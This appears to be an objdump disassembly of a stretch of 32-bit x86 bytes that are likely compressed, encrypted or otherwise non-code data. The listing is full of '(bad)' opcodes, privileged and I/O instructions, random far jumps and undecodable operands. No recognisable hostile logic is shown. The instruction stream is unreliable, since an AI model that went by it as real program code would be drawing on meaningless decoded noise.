  41d38d:	rcr    BYTE PTR [ebp-0x5912133b],0x9d
  41d394:	inc    ebp
  41d395:	jne    0x41d33c
  41d397:	pop    ebp
  41d398:	mov    edx,0x909b9d1a
  41d39d:	push   0x9864c9a9
  41d3a2:	jb     0x41d3e6
  41d3a4:	mov    ecx,0x28980f90
  41d3a9:	pop    ebp
  41d3aa:	jle    0x41d3d5
  41d3ac:	dec    edi
  41d3ad:	enter  0x37e5,0xc
  41d3b1:	dec    edx
  41d3b2:	dec    ebp
  41d3b3:	push   eax
  41d3b4:	out    0xd1,al
  41d3b6:	jne    0x41d3e7
  41d3b8:	out    dx,eax
  41d3b9:	(bad)  
  41d3ba:	mov    dl,0x3b
  41d3bc:	inc    edi
  41d3bd:	xchg   ecx,eax
  41d3be:	mov    ah,0x6d
  41d3c0:	mov    al,0x36
  41d3c2:	mov    cl,0xab
  41d3c4:	pop    eax
  41d3c5:	jo     0x41d3ad
  41d3c7:	inc    esp
  41d3c8:	cmp    BYTE PTR [ebp-0x2c],dl
  41d3cb:	mov    dh,0xad
  41d3cd:	sub    edi,ebx
  41d3cf:	adc    DWORD PTR [edx+ebx*4+0x2d],esi
  41d3d3:	repz fiadd WORD PTR [ebp-0x2de0c4d1]
  41d3da:	fadd   DWORD PTR [eax]
  41d3dc:	(bad)  
  41d3de:	pop    eax
  41d3df:	or     al,0x59
  41d3e1:	mov    esi,0x914ccf01
  41d3e6:	mov    DWORD PTR [ecx],esp
  41d3e8:	xchg   ebp,eax
  41d3e9:	in     al,0x4c
  41d3eb:	sar    DWORD PTR [esi],1
  41d3ed:	lods   eax,DWORD PTR ds:[esi]
  41d3ee:	mov    ah,0x3e
  41d3f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d3f1:	mul    BYTE PTR [esi]
  41d3f3:	call   0x46abd18b
  41d3f8:	mov    eax,ebp
  41d3fa:	mov    edx,0x9517bb76
  41d3ff:	mov    ds:0x83a0e8ff,al
  41d404:	fxch   st(3)
  41d406:	or     ch,BYTE PTR ds:0xab1f75ae
  41d40c:	pop    ebx
  41d40d:	sub    al,0x87
  41d40f:	inc    edx
  41d410:	sbb    bh,BYTE PTR [eax+0x14a90f08]
  41d416:	adc    eax,0xf4fe96e4
  41d41b:	mov    ch,0x12
  41d41d:	outs   dx,BYTE PTR ds:[esi]
  41d41e:	hlt    
  41d41f:	push   eax
  41d420:	add    BYTE PTR [ebx+eax*8-0x80],dl
  41d424:	pop    ebp
  41d425:	cmp    al,0xfa
  41d427:	pop    esi
  41d428:	sub    eax,0xf19fb53a
  41d42d:	pop    ecx
  41d42e:	mov    cs,WORD PTR [edi-0x1d2c591]
  41d434:	pop    ecx
  41d435:	fisubr WORD PTR [eax-0x33]
  41d438:	jp     0x41d41f
  41d43a:	pop    eax
  41d43b:	lahf   
  41d43c:	(bad)  
  41d43d:	enter  0x7089,0x7f
  41d441:	sub    eax,0xa70b07ab
  41d446:	mov    eax,ds:0xb99aefae
  41d44b:	sahf   
  41d44c:	je     0x41d446
  41d44e:	dec    edx
  41d44f:	mov    ecx,DWORD PTR [ecx+0x6fdf696a]
  41d455:	mov    ebx,0xdc4b40a9
  41d45a:	mov    al,ds:0x86c7acb8
  41d45f:	cmp    eax,DWORD PTR [esi]
  41d461:	push   ds
  41d462:	inc    ebx
  41d463:	sub    BYTE PTR [ebp+0x359fd9e7],bh
  41d469:	sbb    al,0x6
  41d46b:	popf   
  41d46c:	mov    DWORD PTR [ecx+0x3854e473],esp
  41d472:	or     BYTE PTR [ebx],0xe0
  41d475:	sbb    BYTE PTR [esi+0x9],ch
  41d478:	adc    DWORD PTR [esp+eax*1],eax
  41d47b:	test   dl,bh
  41d47d:	ror    BYTE PTR [ecx-0x2d],1
  41d480:	and    BYTE PTR [esi-0x44d73c7b],dl
  41d486:	fcomp  QWORD PTR [esi+0x3cb768b3]
  41d48c:	xchg   BYTE PTR [edi],dh
  41d48e:	inc    ecx
  41d48f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d490:	fiadd  WORD PTR [eax]
	...
  41d4f2:	add    BYTE PTR [eax],al
  41d4f4:	div    BYTE PTR [esi]
  41d4f6:	rcl    BYTE PTR [edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0xd095:0x43915389
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    eax,0xb1000001
  41d50d:	hlt    
  41d50e:	pop    ecx
  41d50f:	sbb    BYTE PTR [edx],cl
  41d511:	add    al,0xdc
  41d513:	cwde   
  41d514:	push   eax
  41d515:	add    bh,BYTE PTR [esi-0x669b6a91]
  41d51b:	sub    eax,0xfdedc5ef
  41d520:	jmp    0xfa4913f0
  41d525:	sbb    ah,BYTE PTR [edx+eiz*8-0x73]
  41d529:	jmp    0x41d4bc
  41d52b:	sbb    al,BYTE PTR [esp+ecx*2-0x2d48e524]
  41d532:	add    BYTE PTR [eax],al
  41d534:	icebp  
  41d535:	xor    DWORD PTR [edi+0x3],ebx
  41d538:	xchg   BYTE PTR [edi+ecx*1],ah
  41d53b:	cwde   
  41d53c:	dec    edx
  41d53d:	jns    0x41d4c8
  41d53f:	mov    esi,0xfc5321c3
  41d544:	mov    ds:0x8630152f,eax
  41d549:	jmp    0xed75:0xdee8cf26
  41d550:	inc    esi
  41d551:	setg   ah
  41d554:	xchg   esi,eax
  41d555:	ror    edx,1
  41d557:	and    BYTE PTR [ebp-0x13c37800],0x4e
  41d55e:	push   edi
  41d55f:	shl    al,1
  41d561:	inc    edi
  41d562:	ss daa 
  41d564:	fcmovnu st,st(6)
  41d566:	icebp  
  41d567:	(bad)  
  41d568:	(bad)  
  41d569:	push   ds
  41d56a:	xchg   DWORD PTR [eax-0x5c64a630],ecx
  41d570:	je     0x41d571
  41d572:	rol    DWORD PTR [eax-0x5755ae03],1
  41d578:	mov    gs,WORD PTR [ebp+eiz*4-0x56d13ea1]
  41d57f:	push   ebp
  41d580:	icebp  
  41d581:	shl    BYTE PTR [edi+0x3b040177],0xd1
  41d588:	jl     0x41d5a7
  41d58a:	std    
  41d58b:	gs mov ch,0xe8
  41d58e:	fmul   QWORD PTR [ecx-0x42d41c0]
  41d594:	xchg   ebx,eax
  41d595:	sub    bh,ah
  41d597:	xchg   DWORD PTR [ebx],edx
  41d599:	pop    esp
  41d59a:	push   esp
  41d59b:	mov    esi,0x6eff5e3c
  41d5a0:	cli    
  41d5a1:	pop    ds
  41d5a2:	cmp    eax,0x28d3256e
  41d5a7:	mov    bh,0xff
  41d5a9:	mov    bl,BYTE PTR [ecx-0x5702d41b]
  41d5af:	retf   
  41d5b0:	pushf  
  41d5b1:	sbb    BYTE PTR [edi+0x1131fdd5],0xf1
  41d5b8:	jl     0x41d57a
  41d5ba:	data16 (bad) 
  41d5bc:	mov    fs,WORD PTR [ecx-0x32]
  41d5bf:	jb     0x41d63c
  41d5c1:	push   ebp
  41d5c2:	mov    BYTE PTR [eax+0x4a],al
  41d5c5:	xor    eax,0x1e40d3d0
  41d5ca:	les    edi,FWORD PTR [eax]
  41d5cc:	mov    esp,ebp
  41d5ce:	mov    bh,0xed
  41d5d0:	cmp    DWORD PTR [esi+0xdb138b0],0x55
  41d5d7:	cmp    eax,0x593c1f29
  41d5dc:	cmp    DWORD PTR [eax+edi*1-0x44],edx
  41d5e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5e1:	outs   dx,BYTE PTR ds:[esi]
  41d5e2:	or     ecx,edx
  41d5e4:	inc    ebx
  41d5e5:	add    cl,BYTE PTR [esi-0x75]
  41d5e8:	jmp    0x7f0c5579
  41d5ed:	sub    eax,0x6924b5b
  41d5f2:	mov    eax,ds:0xe6e36dac
  41d5f7:	and    eax,0x65be8903
  41d5fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5fd:	sbb    BYTE PTR [ecx*4-0x51774131],0x55
  41d605:	jl     0x41d60f
  41d607:	add    BYTE PTR [ebp+ecx*8+0x55c29d6d],cl
  41d60e:	imul   ecx,ebx,0x2d
	...
  41d671:	add    BYTE PTR [eax],al
  41d673:	add    BYTE PTR [ecx+ebx*4+0x4c],bh
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x1366e435
  41d681:	mov    edi,0x38d57ad5
  41d686:	add    DWORD PTR [eax],eax
  41d688:	add    eax,0xe9000001
  41d68d:	or     BYTE PTR [edi],0xb4
  41d690:	lea    ebx,[edx+0x27]
  41d693:	arpl   WORD PTR [edx+eiz*1+0x76178fbe],si
  41d69a:	adc    al,0x6e
  41d69c:	mov    ?,edx
  41d69e:	mov    DWORD PTR [edx+edi*8+0x68c82b75],edi
  41d6a5:	shr    DWORD PTR [esp+eax*4],0x98
  41d6a9:	pop    esp
  41d6aa:	add    esi,DWORD PTR [eax-0x79fb181]
  41d6b0:	add    bh,BYTE PTR ds:0xb8c35dcc
  41d6b6:	or     DWORD PTR [edx+0x28b792bb],0xabce1cc6
  41d6c0:	les    esp,FWORD PTR [eax-0x7e872c91]
  41d6c6:	sub    eax,0x4e6432c6
  41d6cb:	aaa    
  41d6cc:	sar    DWORD PTR [eax-0x38378705],0x4c
  41d6d3:	int    0xac
  41d6d5:	sbb    DWORD PTR [edx+eax*4+0x257a2990],0xffffffe9
  41d6dd:	cmp    ebx,eax
  41d6df:	out    0xfc,al
  41d6e1:	push   eax
  41d6e2:	jg     0x41d710
  41d6e4:	lea    edx,[ecx+0x5012308b]
  41d6ea:	sbb    BYTE PTR [eax-0x1d],dh
  41d6ed:	(bad)  
  41d6ee:	in     al,dx
  41d6ef:	mov    al,BYTE PTR [esi+0x17]
  41d6f2:	(bad)  
  41d6f3:	sbb    ebp,eax
  41d6f5:	mov    ebp,0xfeb982f1
  41d6fa:	retf   
  41d6fb:	push   0x54
  41d6fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6fe:	(bad)  
  41d6ff:	outs   dx,BYTE PTR ds:[esi]
  41d700:	mov    WORD PTR ds:0x922e2bc,ss
  41d706:	call   0x4da3:0x8a0a008c
  41d70d:	or     ecx,DWORD PTR [eax+0x72ccfbd5]
  41d713:	ror    ah,0xc1
  41d716:	popa   
  41d717:	fidivr DWORD PTR [edi-0x1e69aa2d]
  41d71d:	mov    bh,0x71
  41d71f:	and    BYTE PTR [edi-0x70113bae],dl
  41d725:	mov    DWORD PTR [ebx*8+0x3d7ff90c],ebx
  41d72c:	xchg   ebx,eax
  41d72d:	std    
  41d72e:	mov    ds:0xebadd8b1,eax
  41d733:	inc    edi
  41d734:	xchg   ebp,eax
  41d735:	test   eax,0xebdee4de
  41d73a:	cwde   
  41d73b:	hlt    
  41d73c:	shl    esi,cl
  41d73e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d73f:	dec    eax
  41d740:	xchg   ebp,eax
  41d741:	pop    eax
  41d742:	inc    edx
  41d743:	cmp    ecx,eax
  41d745:	sub    edi,eax
  41d747:	maxps  xmm0,xmm7
  41d74a:	arpl   WORD PTR [edi-0x39],cx
  41d74d:	jno    0x41d7a8
  41d74f:	mov    ebp,0x5a98ce50
  41d754:	add    ah,dl
  41d756:	jp     0x41d7d7
  41d758:	dec    ebp
  41d759:	(bad)  
  41d75a:	(bad)  
  41d75b:	enter  0xd886,0x7d
  41d75f:	mov    esi,0x4f22b4fa
  41d764:	out    dx,al
  41d765:	scas   eax,DWORD PTR es:[edi]
  41d766:	add    eax,0x7c79fe9b
  41d76b:	jecxz  0x41d7d6
  41d76d:	xlat   BYTE PTR ds:[ebx]
  41d76e:	dec    edx
  41d76f:	pop    ss
  41d770:	jmp    0x291faf5f
  41d775:	mov    bl,0xc9
  41d777:	fild   QWORD PTR [esi+0x2d767c2e]
  41d77d:	inc    ebx
  41d77e:	jmp    0x5c004e30
  41d783:	mov    esp,0x6c92d2a2
  41d788:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d789:	les    esi,FWORD PTR [edx]
  41d78b:	jge    0x41d747
  41d78d:	inc    esi
  41d78e:	mov    eax,0xb5df
	...
  41d7f3:	add    BYTE PTR [esi+ecx*8],ah
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	mov    ecx,0xda34e6fd
  41d805:	cmp    DWORD PTR [ecx],eax
  41d807:	add    BYTE PTR ds:0xee000001,al
  41d80d:	xor    DWORD PTR [edi+0x75],ebx
  41d810:	fild   DWORD PTR [ecx+esi*8]
  41d813:	iret   
  41d814:	sti    
  41d815:	aas    
  41d816:	fistp  QWORD PTR [eax+0x24]
  41d819:	adc    eax,0x451b71c4
  41d81e:	sbb    DWORD PTR [ecx],esi
  41d820:	and    DWORD PTR [esi],0xc13fd125
  41d826:	mov    eax,0x9e17de11
  41d82b:	mov    ecx,0x212fac94
  41d830:	pop    ebp
  41d831:	sub    al,0xbc
  41d833:	repnz test al,0x58
  41d836:	imul   edx,esp,0xffffffca
  41d839:	movntq QWORD PTR [ebx-0x33],mm4
  41d83d:	dec    edi
  41d83e:	or     ebx,DWORD PTR [ecx-0x18]
  41d841:	aaa    
  41d842:	jne    0x41d813
  41d844:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d845:	or     ecx,ecx
  41d847:	jmp    0xb991:0xc19d1246
  41d84e:	push   ebx
  41d84f:	xchg   edi,eax
  41d850:	cli    
  41d851:	in     al,0x3b
  41d853:	stc    
  41d854:	call   0x8514:0x9004034e
  41d85b:	xchg   ecx,eax
  41d85c:	adc    ah,BYTE PTR [ebx]
  41d85e:	sub    ecx,ebx
  41d860:	scas   eax,DWORD PTR es:[edi]
  41d861:	jg     0x41d8a1
  41d863:	bound  esp,QWORD PTR ds:0xacd6afea
  41d869:	call   0xc11f79b1
  41d86e:	(bad)  
  41d870:	xchg   ecx,eax
  41d871:	popa   
  41d872:	xor    dl,BYTE PTR [edi+0x2c60adc]
  41d878:	mov    ecx,0x3e25f04e
  41d87d:	xor    ah,BYTE PTR [ebx+0x4fafc048]
  41d883:	(bad)  ds:0x32eacbe7
  41d889:	bound  edx,QWORD PTR [esi-0x5d]
  41d88c:	add    DWORD PTR [ecx+ecx*2],ecx
  41d88f:	adc    DWORD PTR [ebx-0x5],ebx
  41d892:	std    
  41d893:	fild   QWORD PTR ds:0xaf2f306b
  41d899:	div    DWORD PTR [ebp+ecx*8-0x25]
  41d89d:	jnp    0x41d8a7
  41d89f:	pop    es
  41d8a0:	jnp    0x41d830
  41d8a2:	std    
  41d8a3:	dec    edx
  41d8a4:	inc    eax
  41d8a5:	ins    DWORD PTR es:[edi],dx
  41d8a6:	dec    eax
  41d8a7:	fs test ebp,eax
  41d8aa:	icebp  
  41d8ab:	inc    ch
  41d8ad:	add    DWORD PTR [edx],ecx
  41d8af:	fisubr WORD PTR [edi-0x618cba18]
  41d8b5:	fstp   TBYTE PTR [ebp+0x32]
  41d8b8:	pop    ss
  41d8b9:	xchg   esi,eax
  41d8ba:	cmp    BYTE PTR [ebx],bh
  41d8bc:	stc    
  41d8bd:	rcl    BYTE PTR [edx+0x63],cl
  41d8c0:	inc    ebp
  41d8c1:	loop   0x41d869
  41d8c3:	dec    esp
  41d8c4:	sti    
  41d8c5:	div    DWORD PTR [esi+esi*1]
  41d8c8:	pop    edx
  41d8c9:	bound  esi,QWORD PTR [ecx+eax*1-0x39e93f69]
  41d8d0:	pop    esp
  41d8d1:	pmaxub mm6,mm5
  41d8d4:	push   edx
  41d8d5:	inc    eax
  41d8d6:	scas   eax,DWORD PTR es:[edi]
  41d8d7:	pop    ss
  41d8d8:	jb     0x41d8d1
  41d8da:	xlat   BYTE PTR ds:[ebx]
  41d8db:	or     esi,DWORD PTR [di+0x21d2]
  41d8e0:	jae    0x41d871
  41d8e2:	pop    ecx
  41d8e3:	and    ebp,DWORD PTR [edi]
  41d8e5:	adc    BYTE PTR [ebx],cl
  41d8e7:	mov    ch,0x73
  41d8e9:	jmp    0x1ea9fba3
  41d8ee:	dec    ebp
  41d8ef:	push   DWORD PTR [eax]
  41d8f1:	xlat   BYTE PTR ds:[ebx]
  41d8f2:	sbb    cl,BYTE PTR [edi+0x496dbc0d]
  41d8f8:	cmp    bh,BYTE PTR [eax-0x585590c4]
  41d8fe:	bound  ebp,QWORD PTR [ebp-0x55]
  41d901:	mov    bh,0x46
  41d903:	ss cld 
  41d905:	arpl   WORD PTR [eax+0x5f],sp
  41d908:	xchg   esp,eax
  41d909:	hlt    
  41d90a:	and    eax,0xdf79e471
  41d90f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d910:	jmp    0x41d912
	...
  41d972:	add    BYTE PTR [eax],al
  41d974:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	mov    al,gs:0xdf80f85e
  41d985:	cmp    al,BYTE PTR [ecx]
  41d987:	add    BYTE PTR ds:0x2d000001,al
  41d98d:	mov    ecx,0x1f622508
  41d992:	xor    eax,0x72536658
  41d997:	pop    eax
  41d998:	cmp    BYTE PTR [ebp+0x15],ah
  41d99b:	sub    al,0x1
  41d99d:	xchg   ecx,eax
  41d99e:	adc    DWORD PTR [esi+0x17072c51],0xf3402361
  41d9a8:	push   ebp
  41d9a9:	int3   
  41d9aa:	xor    ebx,DWORD PTR [edx+0x713a0574]
  41d9b0:	pusha  
  41d9b1:	mov    dh,0xb6
  41d9b3:	bnd jne 0x41d9a8
  41d9b6:	mov    BYTE PTR [ecx+0x47d3418d],bl
  41d9bc:	add    DWORD PTR [edi+0x85f2819],esi
  41d9c2:	push   ss
  41d9c3:	les    esp,FWORD PTR [edi-0x56fa3b6b]
  41d9c9:	frstor ds:[esp+edx*8-0x37]
  41d9ce:	shl    DWORD PTR [edx+eax*2],1
  41d9d1:	aaa    
  41d9d2:	push   ecx
  41d9d3:	jl     0x41d95b
  41d9d5:	rcl    DWORD PTR [ebp+0x39],cl
  41d9d8:	dec    esi
  41d9d9:	dec    esi
  41d9da:	cmp    esp,DWORD PTR [ebp+ebp*2+0x30]
  41d9de:	xor    al,0x90
  41d9e0:	outs   dx,DWORD PTR ds:[esi]
  41d9e1:	(bad)  
  41d9e2:	mov    dl,0x4f
  41d9e4:	xchg   edx,eax
  41d9e5:	pusha  
  41d9e6:	adc    al,0x8c
  41d9e8:	imul   ebx,DWORD PTR [ecx+0x2],0x28
  41d9ec:	xchg   edx,eax
  41d9ed:	aas    
  41d9ee:	sahf   
  41d9ef:	push   ecx
  41d9f0:	cmc    
  41d9f1:	ja     0x41da3d
  41d9f3:	jmp    0x4cd2:0x56f693c2
  41d9fa:	ret    
  41d9fb:	pop    edi
  41d9fc:	test   eax,0xc88e2a15
  41da01:	rcl    DWORD PTR [ebx-0x7ff94f6],0x6c
  41da08:	cmp    edi,DWORD PTR [edi+0x5d]
  41da0b:	pushf  
  41da0c:	sbb    DWORD PTR [esi],esp
  41da0e:	fistp  QWORD PTR [ebp+0x69]
  41da11:	mov    ecx,0x683bc5b5
  41da16:	mov    esi,0xc63b6df3
  41da1b:	pop    ss
  41da1c:	(bad)  
  41da1d:	jmp    0x41da73
  41da1f:	and    BYTE PTR [esi-0x38434114],al
  41da25:	(bad)  
  41da26:	jge    0x41da43
  41da28:	and    DWORD PTR [ebx],ebx
  41da2a:	lods   al,BYTE PTR ds:[esi]
  41da2b:	or     esp,DWORD PTR ds:0x845692ae
  41da31:	fnstsw WORD PTR [ebx+ebp*4+0x23]
  41da35:	or     BYTE PTR [eax-0x63bde83f],bl
  41da3b:	outs   dx,BYTE PTR ds:[esi]
  41da3c:	xor    BYTE PTR [ebp-0x7a],al
  41da3f:	cmp    eax,0x5b6923fc
  41da44:	mov    ecx,0x5ef4ce79
  41da49:	outs   dx,DWORD PTR ds:[esi]
  41da4a:	test   eax,0xe7ae73c9
  41da4f:	push   esi
  41da50:	lea    edi,[ebx+0x609f3e06]
  41da56:	pop    ds
  41da57:	jp     0x41dac2
  41da59:	arpl   WORD PTR [ecx-0x4],dx
  41da5c:	xchg   ebp,eax
  41da5d:	adc    DWORD PTR [ebx+ecx*8-0x65786aea],0x3c31a01a
  41da68:	pop    ebx
  41da69:	adc    al,BYTE PTR [edi-0x5f]
  41da6c:	and    al,0x9b
  41da6e:	adc    al,0xf3
  41da70:	ffree  st(4)
  41da72:	jecxz  0x41da50
  41da74:	jb     0x41da0e
  41da76:	or     al,0xea
  41da78:	in     al,dx
  41da79:	dec    edi
  41da7a:	push   es
  41da7b:	add    DWORD PTR [ecx-0x24c4e4e],esp
  41da81:	fcomip st,st(1)
  41da83:	inc    ebx
  41da84:	sbb    edx,esi
  41da86:	jge    0x41dae5
  41da88:	mov    WORD PTR [ecx],ds
  41da8a:	mov    al,0x85
  41da8c:	pop    ebp
  41da8d:	daa    
  41da8e:	jno    0x41da90
  41da90:	fiadd  DWORD PTR [eax]
	...
  41daf2:	add    BYTE PTR [eax],al
  41daf4:	sbb    al,0x15
  41daf6:	jnp    0x41db4b
  41daf8:	jnp    0x41db79
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0xfffffff7
  41db01:	test   DWORD PTR [eax+0x13be4a0],edx
  41db07:	add    BYTE PTR ds:0x4c000001,al
  41db0d:	test   al,0xfa
  41db0f:	add    edi,0xffffffa4
  41db12:	add    ch,bl
  41db14:	loop   0x41db28
  41db16:	sbb    ebx,DWORD PTR [eax]
  41db18:	stos   BYTE PTR es:[edi],al
  41db19:	xor    cl,BYTE PTR [edi]
  41db1b:	ins    DWORD PTR es:[edi],dx
  41db1c:	mov    dl,0xfc
  41db1e:	mov    dl,0x9d
  41db20:	inc    edx
  41db21:	repnz les ebp,FWORD PTR [eax+edx*8]
  41db25:	stos   BYTE PTR es:[edi],al
  41db26:	shl    ebx,1
  41db28:	sahf   
  41db29:	cdq    
  41db2a:	stos   BYTE PTR es:[edi],al
  41db2b:	and    al,0x4f
  41db2d:	out    dx,al
  41db2e:	pop    esi
  41db2f:	mov    bh,0xf2
  41db31:	cmc    
  41db32:	push   ecx
  41db33:	outs   dx,BYTE PTR ds:[esi]
  41db34:	jle    0x41db09
  41db36:	add    eax,0x13ea8459
  41db3b:	fwait
  41db3c:	test   eax,0x38fca1cb
  41db41:	or     BYTE PTR [esi],dh
  41db43:	repnz pop edi
  41db45:	xchg   ecx,eax
  41db46:	mov    esp,?
  41db48:	test   DWORD PTR [ebx-0x60],ebx
  41db4b:	das    
  41db4c:	scas   al,BYTE PTR es:[edi]
  41db4d:	cmp    esi,DWORD PTR [edx]
  41db4f:	xor    eax,0x35d561a4
  41db54:	adc    edi,DWORD PTR [eax]
  41db56:	stc    
  41db57:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db58:	loope  0x41db50
  41db5a:	xor    al,0x1e
  41db5c:	pop    edi
  41db5d:	xchg   BYTE PTR [ebp+0x49],dl
  41db60:	mov    ss,WORD PTR [ebx-0x5d]
  41db63:	mov    DWORD PTR [esi+0x69],0xa2b89e2c
  41db6a:	test   eax,0x8dce4c1
  41db6f:	lods   al,BYTE PTR ds:[esi]
  41db70:	(bad)  
  41db71:	adc    ecx,DWORD PTR [edi]
  41db73:	push   ebp
  41db74:	shl    esp,cl
  41db76:	dec    ebx
  41db77:	push   ebp
  41db78:	xchg   BYTE PTR [ebp-0x2cb86826],ch
  41db7e:	sbb    ebp,ecx
  41db80:	or     eax,0xe6add89
  41db85:	loop   0x41dbd1
  41db87:	add    eax,0xffffffeb
  41db8a:	jg     0x41dbcd
  41db8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41db8d:	cmp    al,0xf2
  41db8f:	leave  
  41db90:	aas    
  41db91:	xlat   BYTE PTR ds:[ebx]
  41db92:	and    DWORD PTR [edx+0x4ca7ce08],0xffffffa1
  41db99:	out    dx,al
  41db9a:	inc    ecx
  41db9b:	add    al,bl
  41db9d:	xor    al,0x6c
  41db9f:	adc    eax,0x7af4c03
  41dba4:	and    DWORD PTR [edx-0x4ddc2526],ebp
  41dbaa:	ret    
  41dbab:	out    dx,al
  41dbac:	pop    edi
  41dbad:	sbb    ecx,DWORD PTR [esi-0x1a]
  41dbb0:	and    bh,dh
  41dbb2:	(bad)  
  41dbb3:	xchg   ecx,eax
  41dbb4:	sbb    DWORD PTR [esi+eiz*2-0x7b],ecx
  41dbb8:	jle    0x41db76
  41dbba:	(bad)  
  41dbbb:	or     al,0x4
  41dbbd:	sub    esp,edx
  41dbbf:	aad    0xaa
  41dbc1:	mov    BYTE PTR ds:0x5f8efbc1,al
  41dbc7:	stos   DWORD PTR es:[edi],eax
  41dbc8:	test   edx,ebx
  41dbca:	jo     0x41dbc8
  41dbcc:	das    
  41dbcd:	(bad)  
  41dbce:	push   ebp
  41dbcf:	ja     0x41dbcd
  41dbd1:	inc    eax
  41dbd2:	test   edx,ecx
  41dbd4:	xchg   ebp,eax
  41dbd5:	int    0x20
  41dbd7:	xor    BYTE PTR [ebx-0x3abebaa9],cl
  41dbdd:	mov    DWORD PTR [ebx-0x53],esp
  41dbe0:	mov    ebp,0xc6f0fb19
  41dbe5:	ret    0x2ad2
  41dbe8:	ins    BYTE PTR es:[edi],dx
  41dbe9:	add    eax,0xf814fc9c
  41dbee:	cmp    esi,edx
  41dbf0:	push   0x50
  41dbf2:	rcl    ch,0xeb
  41dbf5:	fnstsw WORD PTR [edi+edx*4]
  41dbf8:	dec    ecx
  41dbf9:	inc    edx
  41dbfa:	xor    DWORD PTR [eax-0x4e],esi
  41dbfd:	jecxz  0x41dbb0
  41dbff:	mov    ds:0x7e513563,al
  41dc04:	aaa    
  41dc05:	jb     0x41dc5d
  41dc07:	sahf   
  41dc08:	and    ecx,DWORD PTR [eax]
  41dc0a:	mov    edi,0x9401319f
  41dc0f:	or     DWORD PTR [eax+eax*1],ebp
	...
  41dc72:	add    BYTE PTR [eax],al
  41dc74:	outs   dx,DWORD PTR ds:[esi]
  41dc75:	retf   0x9815
  41dc78:	mov    ch,0xdf
  41dc7a:	out    dx,eax
  41dc7b:	jmp    DWORD PTR [edi+0x41b0d050]
  41dc81:	mov    al,ds:0x3ce968d6
  41dc86:	add    DWORD PTR [eax],eax
  41dc88:	add    eax,0x65000001
  41dc8d:	das    
  41dc8e:	fwait
  41dc8f:	xchg   ebp,eax
  41dc90:	stos   BYTE PTR es:[edi],al
  41dc91:	jp     0x41dc28
  41dc93:	push   cs
  41dc94:	daa    
  41dc95:	not    BYTE PTR [esi+0x453a1479]
  41dc9b:	cli    
  41dc9c:	xchg   ecx,eax
  41dc9d:	push   0x2f22b046
  41dca2:	hlt    
  41dca3:	mov    ecx,0x649030e0
  41dca8:	and    edx,DWORD PTR [edx]
  41dcaa:	mov    cl,BYTE PTR [edi+0xa]
  41dcad:	xchg   ebx,eax
  41dcae:	pop    es
  41dcaf:	imul   esi,ebx,0xd
  41dcb2:	dec    edx
  41dcb3:	lods   eax,DWORD PTR ds:[esi]
  41dcb4:	inc    esi
  41dcb5:	jge    0x41dc62
  41dcb7:	mov    edi,0x817809d9
  41dcbc:	scas   al,BYTE PTR es:[edi]
  41dcbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41dcbe:	dec    esi
  41dcbf:	sbb    BYTE PTR [esi+0x5594d5f6],ch
  41dcc5:	inc    ebx
  41dcc6:	mov    eax,DWORD PTR [eax+0x67079495]
  41dccc:	retf   0xa335
  41dccf:	cmp    BYTE PTR [edi+0x157330bb],cl
  41dcd5:	ss stos DWORD PTR es:[edi],eax
  41dcd7:	mov    dh,0x6
  41dcd9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dcda:	pop    esp
  41dcdb:	lea    ecx,[ecx-0x75]
  41dcde:	cld    
  41dcdf:	sbb    ebp,DWORD PTR [ebp-0x20]
  41dce2:	sub    edi,ebp
  41dce4:	or     ecx,esi
  41dce6:	add    BYTE PTR [ecx+edx*2-0x9],al
  41dcea:	xchg   BYTE PTR ss:[ecx-0x10],bh
  41dcee:	iret   
  41dcef:	into   
  41dcf0:	mov    ebp,0x983db1e3
  41dcf5:	or     ebx,ebp
  41dcf7:	push   ebp
  41dcf8:	daa    
  41dcf9:	data16 mov dh,BYTE PTR [ecx]
  41dcfc:	retf   
  41dcfd:	adc    al,0x9c
  41dcff:	and    BYTE PTR [edx+0x6b],al
  41dd02:	imul   esp,DWORD PTR [eax-0x4a],0xfffffffd
  41dd06:	xchg   ecx,eax
  41dd07:	dec    ebp
  41dd08:	or     BYTE PTR [edx-0x14],ch
  41dd0b:	into   
  41dd0c:	jns    0x41dd19
  41dd0e:	sbb    BYTE PTR [ecx],dh
  41dd10:	iret   
  41dd11:	jo     0x41dc93
  41dd13:	jl     0x41dc96
  41dd15:	push   ebp
  41dd16:	ins    BYTE PTR es:[edi],dx
  41dd17:	js     0x41dd44
  41dd19:	sbb    edx,eax
  41dd1b:	aad    0xf0
  41dd1d:	inc    edi
  41dd1e:	dec    esp
  41dd1f:	xchg   edx,eax
  41dd20:	xor    al,0x26
  41dd22:	and    al,0xb5
  41dd24:	or     al,BYTE PTR [ebp-0x5ebf8814]
  41dd2a:	mov    eax,ds:0x1c750677
  41dd2f:	dec    ebx
  41dd30:	sub    DWORD PTR [ebx+0x6a],ebx
